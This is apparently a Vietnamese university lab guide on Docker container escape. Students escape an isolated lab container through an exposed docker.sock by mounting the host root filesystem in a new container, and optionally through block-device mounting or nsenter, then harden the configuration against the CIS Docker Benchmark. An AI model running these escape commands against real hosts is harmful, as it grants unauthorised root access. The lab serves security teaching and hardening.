Học viện Công nghệ Bưu chính Viễn thông — SecLab PTIT
HƯỚNG DẪN THỰC HÀNH
devops-docker-escape — Thoát Container Chiếm Quyền Host (Docker Container Escape)
Mức độ: Nâng cao
Container Security / DevSecOps
Ánh xạ khung tham chiếu: MITRE ATT&CK for Containers — Escape to Host (T1611) · CIS Docker Benchmark

## 1. Giới thiệu lab

| Thông tin | Chi tiết |
|---|---|
| **Tên Lab** | `devops-docker-escape` |
| **Mức độ** | Nâng cao |
| **Công cụ sử dụng** | `docker` CLI, `mount`, `nsenter`, `capsh` / `getcap` (libcap), `cat`, `ls`, `grep`, trinh sát thủ công |
| **Kiến thức yêu cầu** | Sử dụng Linux shell cơ bản (di chuyển thư mục, đọc file, đường ống lệnh); hiểu sơ lược Docker là gì (image, container, volume). Các khái niệm chuyên sâu (namespaces, capabilities, cgroups, Docker socket) được **nhắc lại đầy đủ** trong mục Kiến thức bổ trợ nên **không cần** đã làm bài lab nào trước đó. |

### Mục tiêu học tập
- Hiểu ranh giới cô lập (isolation boundary) giữa container và host được tạo bởi Linux **namespaces**, **capabilities** và **cgroups**, cũng như vì sao ranh giới này KHÔNG phải là ranh giới bảo mật tuyệt đối như máy ảo.
- Nhận diện các dấu hiệu (indicators) cho thấy một container bị cấu hình yếu và có nguy cơ bị "thoát" (escape): mount `/var/run/docker.sock`, cấp thừa capability như `CAP_SYS_ADMIN`, cờ `--privileged`.
- Nắm được kỹ thuật thoát container qua Docker socket bị lộ và ánh xạ nó vào kỹ thuật MITRE ATT&CK T1611 (Escape to Host).
- Áp dụng tư duy DevSecOps: từ vị trí attacker chuyển sang vị trí defender để **hardening** cấu hình container theo CIS Docker Benchmark.

### Kỹ năng đạt được
- Kỹ năng **trinh sát nội bộ container** (in-container reconnaissance) để phát hiện cấu hình sai: đọc `/proc/1/cgroup`, `/proc/self/status`, liệt kê capabilities, kiểm tra socket/thiết bị được mount.
- Kỹ năng **khai thác Docker socket** bị lộ để tạo container đặc quyền mount toàn bộ hệ thống tập tin của host.
- Kỹ năng **đánh giá & khắc phục rủi ro cấu hình**: viết lại lệnh chạy container an toàn (drop capability, bỏ privileged, chạy non-root, seccomp/AppArmor).
- Kỹ năng đối chiếu cấu hình thực tế với một khung chuẩn công nghiệp (CIS Docker Benchmark).

---

## 2. Kịch bản

### Tình huống
Sinh viên đóng vai một **pentester** trong một cuộc đánh giá bảo mật (red team engagement). Trong giai đoạn trước, đội đã khai thác một lỗ hổng ứng dụng web và giành được một shell **bên trong một container** tên `app` (IP `172.35.0.10`). Container này chạy một ứng dụng nội bộ nhưng bị đội DevOps cấu hình cẩu thả khi triển khai nhanh.

Mục tiêu của attacker bây giờ không dừng ở việc kiểm soát ứng dụng — mà là **thoát khỏi container để chiếm quyền trên máy host** đang chạy Docker Engine (được mô phỏng bởi container `host-sim`, IP `172.35.0.5`). Trên host có một tập tin nhạy cảm `/root/flag.txt` mà **chỉ có thể đọc được sau khi đã escape thành công** — nó không nằm trong không gian tập tin của container `app`.

Sau khi chứng minh được đường tấn công, sinh viên đổi vai thành **DevSecOps engineer** và phải chỉ ra cấu hình an toàn để bịt lỗ hổng.

### Vai trò của sinh viên
1. Trên container `app` (nơi đã có shell), thực hiện trinh sát để **xác định container đang bị cấu hình yếu** ở điểm nào (docker.sock? capability thừa? privileged?).
2. **Khai thác** cấu hình sai đó để truy cập hệ thống tập tin của host.
3. **Đọc flag** đặt trên host — bằng chứng của việc escape thành công.
4. Đóng vai defender: **đề xuất và viết cấu hình `docker run` an toàn** khắc phục lỗ hổng, đối chiếu CIS Docker Benchmark.

### Sơ đồ mạng

```
                       Mạng ảo Labtainer LAB_NET: 172.35.0.0/24
   ┌───────────────────────────┐              ┌───────────────────────────────┐
   │  Container: app             │              │  Container: host-sim          │
   │  IP: 172.35.0.10            │              │  IP: 172.35.0.5                │
   │  (nơi sinh viên có shell)   │              │  Vai: MÔ PHỎNG MÁY HOST         │
   │                             │              │  - Chạy Docker Engine thật     │
   │  Cấu hình SAI (chủ đích):   │  escape ──►  │  - /root/flag.txt  (mục tiêu)  │
   │   • /var/run/docker.sock    │  T1611       │  - rootfs "host" = "/" của     │
   │     nối tới daemon của host │◄─ socket ───►│    host-sim                     │
   │  Công cụ: docker, mount,    │  /var/run/   │  - Docker daemon socket:        │
   │   nsenter, capsh, getcap    │  docker.sock │    /var/run/docker.sock         │
   └───────────────────────────┘              └───────────────────────────────┘
        │  Sinh viên gõ lệnh tại đây                 ▲
        └───── luồng tấn công: trinh sát → escape → đọc flag trên host ─────────┘
```

> Ghi chú: Trong Labtainer không có "host thật" để escape ra (vì mọi thứ đều là container). Vì vậy vai trò máy host được **mô phỏng** bằng container `host-sim`; container `app` được nối tới daemon Docker thật của `host-sim` thông qua `/var/run/docker.sock`.

---

## 3. Kiến thức bổ trợ

### Kiến thức nền tảng

**Container không phải máy ảo.** Một container chỉ là một (nhóm) tiến trình chạy trực tiếp trên **kernel của host**, được "nhốt" lại bằng ba cơ chế của Linux kernel:
- **Namespaces**: tạo ảo giác về một hệ thống riêng — PID namespace (danh sách tiến trình riêng, tiến trình đầu tiên là PID 1), MOUNT namespace (cây thư mục riêng), NET namespace (card mạng/IP riêng), v.v. Vì cùng chung kernel, nếu tiến trình được đưa trở lại namespace của host thì nó "thấy" toàn bộ host.
- **Capabilities**: Linux chia nhỏ quyền của `root` thành ~40 mảnh quyền (capability). Container mặc định chỉ được cấp một tập con an toàn. `CAP_SYS_ADMIN` là "capability quyền lực nhất" — cho phép `mount`, thao tác nhiều tài nguyên kernel, và thường là bước đệm để escape.
- **cgroups**: giới hạn/kế toán tài nguyên (CPU, RAM). Đường dẫn cgroup của tiến trình (`/proc/1/cgroup`) thường để lộ dấu vết cho biết tiến trình đang chạy trong container Docker (chuỗi `docker`/`kubepods`...).

**Escape to Host (MITRE ATT&CK T1611)** là kỹ thuật kẻ tấn công lợi dụng cấu hình sai hoặc lỗ hổng để phá vỡ ranh giới cô lập, thực thi lệnh trên host. Một số cấu hình sai kinh điển dẫn tới escape:

1. **Mount Docker socket (`/var/run/docker.sock`)**: Docker socket là "vô lăng" điều khiển Docker daemon (chạy với quyền root trên host). Ai nói chuyện được với socket này thì **ra lệnh cho daemon** tạo container mới. Attacker chỉ cần yêu cầu daemon tạo một container mới có `-v /:/host` (mount toàn bộ rootfs host vào container mới) là đọc/ghi được mọi file của host. Tương đương root trên host.
2. **`--privileged`**: tắt gần như toàn bộ cơ chế cô lập — cấp mọi capability, cho container thấy nhiều thiết bị của host trong `/dev`. Trong một số môi trường, attacker có thể `mount` thẳng một thiết bị khối của host để đọc/ghi rootfs.
3. **Capability nguy hiểm (`CAP_SYS_ADMIN`)**: dù không `--privileged`, nếu container được cấp `CAP_SYS_ADMIN` thì attacker có thể `mount` và lạm dụng nhiều cơ chế kernel để thoát ra, hoặc dùng `nsenter` nhảy vào namespace của một tiến trình khác nếu có chia sẻ namespace.

**Kiến thức DevOps liên quan (phần môi trường ~40%):** cách một container được khởi chạy hoàn toàn quyết định bởi các tham số `docker run` (`--privileged`, `--cap-add`, `-v`, `--user`, `--security-opt`). Đây chính là "bề mặt cấu hình" mà DevSecOps phải kiểm soát trong pipeline. **CIS Docker Benchmark** là bộ khuyến nghị cấu hình an toàn cho Docker (ví dụ: 5.4 không dùng privileged, 5.3 hạn chế capabilities, 5.31 không mount docker.sock vào container).

### Thành phần cần quan sát trong bài lab

| Thành phần | Vai trò |
|---|---|
| `/proc/1/cgroup`, `/proc/self/status` | Cho biết đang ở trong container và tập capability hiệu lực (dòng `CapEff`). Dấu hiệu trinh sát đầu tiên. |
| `/var/run/docker.sock` (trên `app`) | Socket điều khiển Docker daemon; nếu bị lộ vào container = chìa khoá chiếm host. |
| `CapEff` chứa cờ tương ứng `CAP_SYS_ADMIN` / block device host trong `/dev` (nếu có) | Dấu hiệu bổ trợ cho thấy container được cấp quyền thừa. |
| `host-sim` — `/root/flag.txt` | Vùng chỉ truy cập được **sau khi escape**; chứa flag mục tiêu. |
| Cấu hình `docker run` an toàn (nhiệm vụ hardening) | Sản phẩm phòng thủ: lệnh khởi chạy container đã được vá lỗ hổng. |

### Bảng công cụ & cú pháp

| Công cụ | Tùy chọn / Cú pháp | Mô tả tác dụng |
|---|---|---|
| `cat` / `grep` | `cat /proc/1/cgroup` ; `grep -i cap /proc/self/status` | Xác nhận đang trong container và đọc các capability đang hiệu lực (`CapEff`). |
| `capsh` | `capsh --print` ; `capsh --decode=<hex>` | Liệt kê capability dạng dễ đọc; giải mã giá trị hex `CapEff` sang tên capability. |
| `getcap` | `getcap -r / 2>/dev/null` | Tìm file được gán capability (bổ trợ trinh sát). |
| `ls` | `ls -la /var/run/docker.sock` | Kiểm tra sự tồn tại của Docker socket bị lộ. |
| `docker` (qua socket) | `docker -H unix:///var/run/docker.sock ps` ; `docker -H unix:///var/run/docker.sock run -v /:/host <IMG> chroot /host <cmd>` | Nói chuyện với daemon host qua socket; tạo container mới mount rootfs host. |
| `mount` / `nsenter` | `mount /dev/sda1 /mnt/host` ; `nsenter --target 1 --mount --uts --ipc --net --pid -- sh` | Kỹ thuật thoát thay thế qua `--privileged`/`CAP_SYS_ADMIN` (Nhiệm vụ 3 — tuỳ chọn, xem ghi chú trong nhiệm vụ). |
| `fdisk` / `lsblk` | `fdisk -l` ; `lsblk` | Liệt kê ổ đĩa/phân vùng nhìn thấy được (dấu hiệu bổ trợ). |

---

## 4. Các nhiệm vụ của bài thực hành

Để tải bài thực hành, sinh viên thực hiện câu lệnh:

```bash
imodule https://github.com/namlt04/do-an-2026/raw/refs/heads/master/imodule/devops-docker-escape.tar
```

Để khởi động bài thực hành, sinh viên dùng câu lệnh:

```bash
labtainer devops-docker-escape
```

(chú ý: sinh viên sử dụng **mã sinh viên** của mình để nhập thông tin email người thực hiện bài lab khi có yêu cầu, để sử dụng khi chấm điểm)

Sau khi khởi động xong, một terminal ảo sẽ xuất hiện, đại diện cho shell mà attacker đã có **bên trong container `app`**.

---

### Nhiệm vụ 1 — `recon_container`: Trinh sát và nhận diện cấu hình yếu

**Mục tiêu:** Xác nhận mình đang ở trong một container và tìm ra điểm cấu hình sai có thể dẫn tới escape.

**Bước 1:** Xác nhận đang ở trong container Docker bằng cách kiểm tra cgroup của PID 1:
```bash
cat /proc/1/cgroup
```

**Bước 2:** Đọc tập capability đang hiệu lực của tiến trình hiện tại:
```bash
grep -i cap /proc/self/status
capsh --print
```
Chú ý dòng `CapEff`. Giải mã nếu cần: `capsh --decode=<gia_tri_hex_CapEff>`

**Bước 3:** Kiểm tra xem Docker socket của host có bị lộ vào container không:
```bash
ls -la /var/run/docker.sock
```

**Bước 4:** Kiểm tra xem có nhìn thấy thiết bị khối (ổ đĩa) nào bất thường không (dấu hiệu bổ trợ):
```bash
ls -la /dev/sd* 2>/dev/null
fdisk -l 2>/dev/null
lsblk 2>/dev/null
```

**Bước 5:** Ghi lại các phát hiện vào một file trong thư mục cá nhân để tiện đối chiếu:
```bash
{ echo "=== cgroup ==="; cat /proc/1/cgroup;
  echo "=== CapEff ==="; grep -i cap /proc/self/status;
  echo "=== docker.sock ==="; ls -la /var/run/docker.sock 2>/dev/null;
  echo "=== block devices ==="; ls -la /dev/sd* 2>/dev/null; } > ~/recon.txt
cat ~/recon.txt
```

**Điều kiện hoàn thành nhiệm vụ:** File `~/recon.txt` được tạo và chứa bằng chứng cho ÍT NHẤT một cấu hình sai — tức có tối thiểu một trong các dấu hiệu: (a) `/var/run/docker.sock` tồn tại, (b) `CapEff` chứa `cap_sys_admin`, hoặc (c) nhìn thấy block device `/dev/sda*`.

**Câu hỏi 1:** Dựa trên kết quả trinh sát, hãy nêu chính xác (các) điểm cấu hình sai bạn phát hiện được và giải thích vì sao mỗi điểm đó lại phá vỡ ranh giới cô lập giữa container và host.
Trả lời: _______________________________________

---

### Nhiệm vụ 2 — `escape_via_socket`: Thoát container qua Docker socket bị lộ

**Mục tiêu:** Lợi dụng `/var/run/docker.sock` bị lộ vào `app` để ra lệnh cho Docker daemon của host tạo một container mới mount toàn bộ rootfs của host, qua đó truy cập hệ thống tập tin host.

**Bước 1:** Kiểm tra có thể nói chuyện với daemon host qua socket không:
```bash
docker -H unix:///var/run/docker.sock version
docker -H unix:///var/run/docker.sock ps
```
(nếu socket chưa sẵn sàng, thử đường dự phòng: `docker -H tcp://172.35.0.5:2375 version`)

**Bước 2:** Liệt kê image sẵn có trên daemon host để chọn image tạo container mới:
```bash
docker -H unix:///var/run/docker.sock images
```
Bạn sẽ thấy một image tối giản có sẵn (ví dụ `escimg`) — image này chỉ chứa `sh`/`chroot`, đủ dùng để đi vào rootfs host, hoàn toàn không cần tải gì thêm.

**Bước 3:** Tạo một container mới **mount toàn bộ rootfs host (`/`)** vào `/host`, rồi `chroot` vào đó để có được ngữ cảnh "root trên host":
```bash
docker -H unix:///var/run/docker.sock run -d --name esc -v /:/host <IMAGE> sleep 3600
docker -H unix:///var/run/docker.sock ps
```
(thay `<IMAGE>` bằng image xuất hiện ở Bước 2). Container `esc` chạy nền và có toàn bộ rootfs host nằm tại `/host`.

> **Lưu ý:** Để lấy dữ liệu từ host ổn định, nên tạo container **chạy nền (`-d`)** rồi dùng `docker cp` (hoặc `docker logs`) để trích xuất, thay vì `docker run` tương tác (`-it`).

**Bước 4:** Lấy bằng chứng escape (canary chỉ tồn tại trên host) từ container `esc` bằng `docker cp` và lưu vào thư mục cá nhân:
```bash
docker -H unix:///var/run/docker.sock cp esc:/host/root/.hostmarker ~/host_evidence.txt
cat ~/host_evidence.txt
```
(Muốn xem thêm trên host: `docker -H unix:///var/run/docker.sock exec esc ls -la /host/root`.)

**Điều kiện hoàn thành nhiệm vụ:** Từ bên trong container `app`, tạo thành công một container mới qua socket, truy cập được rootfs của host và lưu đúng nội dung canary của host vào `~/host_evidence.txt`.

**Câu hỏi 2:** Vì sao việc mount `/var/run/docker.sock` vào một container gần như tương đương với việc cấp quyền `root` trên host cho bất kỳ ai kiểm soát được container đó? (Gợi ý: nghĩ về quyền mà Docker daemon chạy dưới đó.)
Trả lời: _______________________________________

---

### Nhiệm vụ 3 — `escape_via_privileged` (TUỲ CHỌN): Thoát container qua privileged / CAP_SYS_ADMIN

**Mục tiêu:** Tìm hiểu (không bắt buộc để hoàn thành bài) một đường thoát thay thế: lợi dụng việc container được chạy `--privileged` hoặc có `CAP_SYS_ADMIN` để mount trực tiếp thiết bị của host và/hoặc đột nhập namespace tiến trình host.

> **Lưu ý quan trọng:** Nhiệm vụ này mang tính **minh hoạ khái niệm**, không bắt buộc để lấy flag. Khả năng thực hiện thành công phụ thuộc vào lớp Docker/ảo hoá của máy đang chạy Labtainer (nested privileged containers không phải lúc nào cũng ổn định) — nếu container `app` của bạn không có `CAP_SYS_ADMIN` hoặc không nhìn thấy block device nào ở Nhiệm vụ 1, hãy bỏ qua nhiệm vụ này và tập trung vào Nhiệm vụ 2 (đường **bắt buộc** để lấy flag).

**Cách A — Mount block device (nếu container có quyền và nhìn thấy thiết bị):**
```bash
fdisk -l
lsblk
mkdir -p /mnt/host
mount -o ro /dev/sda1 /mnt/host   # thay sda1 bang phan vung phu hop neu khac
ls -la /mnt/host/root
umount /mnt/host                  # go mount lai sau khi xem xong
```

**Cách B — `nsenter` vào namespace của một tiến trình (khi có chia sẻ namespace và đủ đặc quyền):**
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- sh
hostname
```

**Điều kiện hoàn thành nhiệm vụ (tuỳ chọn):** Trình bày được trong báo cáo các dấu hiệu privileged/CAP_SYS_ADMIN quan sát được ở Nhiệm vụ 1 và giải thích vì sao chúng có thể dẫn tới escape trong một môi trường có cấu hình tương ứng.

**Câu hỏi 3:** So sánh mức độ nguy hiểm và điều kiện tiền đề của ba đường escape (docker.sock, `--privileged`, `CAP_SYS_ADMIN` đơn lẻ). Theo bạn, đường nào "ồn ào"/dễ bị phát hiện nhất và vì sao?
Trả lời: _______________________________________

---

### Nhiệm vụ 4 — `get_flag`: Đọc flag trên host

**Mục tiêu:** Dùng quyền truy cập host vừa giành được ở Nhiệm vụ 2 để đọc tập tin bí mật `/root/flag.txt` trên host — bằng chứng escape thành công.

**Bước 1:** Lấy flag từ `/root/flag.txt` của host (qua container `esc` đã mount rootfs host) và lưu ra file kết quả trong thư mục cá nhân:
```bash
docker -H unix:///var/run/docker.sock cp esc:/host/root/flag.txt ~/flag_result.txt
cat ~/flag_result.txt
```

**Điều kiện hoàn thành nhiệm vụ:** File `~/flag_result.txt` chứa chuỗi flag đúng định dạng (`PTIT{...}`), được lấy từ `/root/flag.txt` của host — thứ không thể đọc được nếu chưa escape.

**Câu hỏi 4:** Trình bày lại toàn bộ chuỗi tấn công của bạn từ shell ban đầu trong container tới khi đọc được flag trên host. Đâu là "nguyên nhân gốc rễ" (root cause) khiến escape thành công?
Trả lời: _______________________________________

---

### Nhiệm vụ 5 — `harden_container`: Khắc phục và cấu hình container an toàn (DevSecOps)

**Mục tiêu:** Đổi vai thành DevSecOps engineer, đề xuất cấu hình `docker run` an toàn loại bỏ đường escape, và đối chiếu với CIS Docker Benchmark. Đây là nhiệm vụ phòng thủ bắt buộc.

**Bước 1:** Viết lại lệnh khởi chạy container `app` theo nguyên tắc đặc quyền tối thiểu (least privilege). Lưu vào file `~/hardened_run.sh`. Cấu hình an toàn cần đảm bảo:
- KHÔNG dùng `--privileged`.
- KHÔNG mount `/var/run/docker.sock` vào container.
- Loại bỏ toàn bộ capability rồi chỉ thêm lại thứ thực sự cần (`--cap-drop=ALL`, có thể `--cap-add=<chỉ_cái_cần>`).
- Bật no-new-privileges, chạy user không phải root (`--user`), và seccomp/AppArmor.
- Mount tài nguyên ở chế độ chỉ đọc khi có thể (`--read-only`).

Mẫu (sinh viên tự hoàn thiện các `<...>`):
```bash
cat > ~/hardened_run.sh <<'EOF'
docker run -d --name app \
  --cap-drop=ALL \
  --security-opt=no-new-privileges \
  --security-opt seccomp=/etc/docker/seccomp-default.json \
  --user <uid_khong_phai_root> \
  --read-only \
  --pids-limit <n> \
  <IMAGE>
# LUU Y: KHONG co --privileged, KHONG co -v /var/run/docker.sock:...
EOF
cat ~/hardened_run.sh
```

**Bước 2:** Lập bảng đối chiếu từng cấu hình sai đã khai thác với biện pháp khắc phục và mục CIS Docker Benchmark tương ứng, lưu vào `~/hardening_map.txt`:
```bash
cat > ~/hardening_map.txt <<'EOF'
docker.sock mount   -> Bo mount socket; neu can dieu khien docker, dung proxy co kiem soat (CIS 5.31)
--privileged        -> Bo privileged; chi cap quyen toi thieu                      (CIS 5.4)
CAP_SYS_ADMIN thua  -> --cap-drop=ALL roi cap-add dung nhu cau                      (CIS 5.3)
Chay bang root      -> --user / userns-remap                                         (CIS 4.1 / 2.8)
Khong co seccomp    -> Bat seccomp/AppArmor + no-new-privileges                      (CIS 5.1 / 5.21)
EOF
cat ~/hardening_map.txt
```

**Bước 3 (kiểm chứng, tuỳ chọn):** Giải thích vì sao với cấu hình mới, bước escape ở Nhiệm vụ 2 sẽ thất bại (không còn socket để gọi daemon).

**Điều kiện hoàn thành nhiệm vụ:** Tồn tại cả hai file `~/hardened_run.sh` (lệnh chạy KHÔNG chứa `--privileged` và KHÔNG mount `docker.sock`, có `--cap-drop=ALL`) và `~/hardening_map.txt` (ánh xạ đủ các cấu hình sai đã khai thác tới biện pháp khắc phục).

**Câu hỏi 5:** Trong pipeline CI/CD, bạn sẽ tự động hoá việc ngăn chặn cấu hình sai này ở khâu nào và bằng công cụ gì (ví dụ kiểm tra tĩnh cấu hình, policy-as-code, quét image)? Giải thích ngắn gọn vì sao "shift-left" lại hiệu quả hơn chỉ phòng thủ ở runtime.
Trả lời: _______________________________________

---

## 5. Ánh xạ khung tham chiếu

| Kỹ thuật / cấu hình sai | MITRE ATT&CK | CIS Docker Benchmark |
|---|---|---|
| Escape qua Docker socket bị lộ | T1611 — Escape to Host | 5.31 |
| Chạy `--privileged` | T1611 | 5.4 |
| Capability thừa (`CAP_SYS_ADMIN`) | T1611 | 5.3 |
| Chạy container bằng root | — | 4.1 / 2.8 |
| Thiếu seccomp/AppArmor | — | 5.1 / 5.21 |
